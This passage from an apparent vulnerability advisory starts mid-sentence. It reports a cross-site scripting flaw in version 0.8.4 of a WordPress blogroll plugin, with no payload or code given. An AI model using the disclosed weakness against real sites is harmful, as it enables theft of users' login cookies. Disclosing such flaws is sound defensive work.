    is prone to a cross-site scripting vulnerability because it fails to properly
    sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary
    script code in the browser of an unsuspecting user in the context of the affected
    site. This can allow the attacker to steal cookie-based authentication credentials
    and launch other attacks. WordPress Plugin Blogroll Fun-Show Last Post and Last
    Update Time version 0.8.4 is vulnerable; prior versions may also be affected.
